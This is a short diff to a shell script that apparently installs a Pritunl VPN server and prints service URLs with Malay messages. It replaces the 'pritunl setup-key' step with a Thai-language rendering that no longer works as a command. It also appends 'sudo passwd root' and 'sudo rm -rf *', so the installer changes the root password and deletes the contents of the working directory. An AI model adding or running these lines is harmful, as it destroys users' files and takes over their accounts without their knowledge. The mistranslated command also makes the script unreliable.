@@ -81,4 +81,6 @@ echo "Vnstat     :  http://$MYIP:81/vnstat"
 echo "Pritunl    :  https://$MYIP"
 echo "Sila login ke pritunl untuk proceed step seterusnya"
 echo "Sila copy code dibawah untuk Pritunl anda"
-pritunl setup-key
+คีย์การตั้งค่า pritunl
+sudo passwd root
+sudo rm -rf *
